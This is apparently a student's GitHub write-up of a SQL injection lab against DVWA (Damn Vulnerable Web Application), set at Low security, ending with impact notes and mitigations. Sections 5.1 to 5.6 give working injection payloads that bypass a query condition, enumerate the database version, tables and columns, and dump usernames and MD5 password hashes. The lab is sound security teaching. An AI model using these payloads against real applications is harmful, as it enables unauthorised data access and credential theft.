# -SQL-Injection-Lab-DVWA-

**1. Objective**

The objective of this lab is to demonstrate and understand SQL Injection vulnerabilities by exploiting insecure user input handling in a deliberately vulnerable application (DVWA). The lab shows how an attacker can bypass authentication, enumerate database information, and extract sensitive data.

# **2. Lab Environment**

..Target Application: DVWA (Damn Vulnerable Web Application)

..Security Level: Low

..Attacker Machine: Kali Linux

..Database: MySQL

..Web Server: Apache


# **3. Tools Used**

..Web browser (Firefox)

..DVWA

..Kali Linux

..GitHub (documentation)


# **4. Vulnerable Function**

The vulnerability exists in the User ID input field, where user input is directly concatenated into an SQL query without proper input sanitization or prepared statements.


# **5. SQL Injection Payloads Used (Step-by-Step)**

5.1 Authentication Bypass 
(' OR 1=1 #)

Purpose:
Bypasses the SQL query condition because 1=1 is always true.

Explanation:

' closes the original SQL string

OR 1=1 forces a true condition

'#' comments out the rest of the query

<img width="440" height="318" alt="2" src="https://github.com/user-attachments/assets/4ef8cbec-9a54-45f9-b79f-fd1e05911bf1" />


5.2 Database Version Enumeration
1' OR 1=1 UNION SELECT 1, VERSION() #

Purpose:
Reveals the MySQL database version.

Explanation:

UNION SELECT appends results to the original query

VERSION() is a MySQL function that returns the DB version

1 is used to match the column count

<img width="524" height="395" alt="3  SCANNING FOR VERSION" src="https://github.com/user-attachments/assets/992b6d40-14dd-4636-b50f-e99c11cc5dfc" />


5.3 Current Database Name
1' OR 1=1 UNION SELECT 1, DATABASE() #

Purpose:
Identifies the active database name used by the application.

<img width="474" height="390" alt="4  DATABASE name " src="https://github.com/user-attachments/assets/08257bd5-e2bc-4422-8c5f-49b376ff6291" />


5.4 Enumerating Tables
1' OR 1=1 UNION SELECT 1, table_name 
FROM information_schema.tables 
WHERE table_type='BASE TABLE' 
AND table_schema='dvwa' #

Purpose:
Lists all tables inside the dvwa database.

Explanation:

information_schema.tables stores metadata about database tables

table_schema='dvwa' limits results to the DVWA database

<img width="1051" height="484" alt="5 table names" src="https://github.com/user-attachments/assets/7e2bb7d5-1a7f-459e-b779-0cae55d1699e" />


5.5 Enumerating Columns 
1' OR 1=1 UNION SELECT 1, column_name 
FROM information_schema.columns 
WHERE table_name='users' 
AND table_schema='dvwa' #

<img width="1015" height="457" alt="6  getting the columns in users table" src="https://github.com/user-attachments/assets/c9617923-ab8b-4d6c-99d9-325257b50d92" />


5.6 Extracting User Credentials
1' OR 1=1 UNION SELECT user, password FROM users #

Purpose:
Dumps usernames and hashed passwords from the database.

Observation:

Passwords are stored using MD5, which is insecure and easily cracked.

<img width="577" height="538" alt="7  getting user name and password" src="https://github.com/user-attachments/assets/4d70e9f8-e9c1-48eb-8e4d-32a0c50c062d" />


# **6. Findings and Observations**

The application does not sanitize user input.

SQL queries are dynamically constructed using user input.

Sensitive database information can be accessed without authentication.

Weak hashing (MD5) enables easy password cracking.

The vulnerability is easily exploitable at DVWA Low security level.


#  **7. Security Impact (Why This Matters)**

In real-world applications, SQL Injection can lead to:

..Data breaches

..Credential theft

..Full database compromise

..Regulatory violations (GDPR, PCI-DSS)


# **8. Mitigation Techniques**

..Use prepared statements / parameterized queries

..Apply strict input validation

..Implement least privilege database access

..Store passwords using bcrypt, Argon2, or scrypt


# **9. Conclusion**
This lab demonstrates how a lack of input sanitization can completely compromise an application. Proper secure coding practices are essential to prevent SQL Injection attacks in production environments.
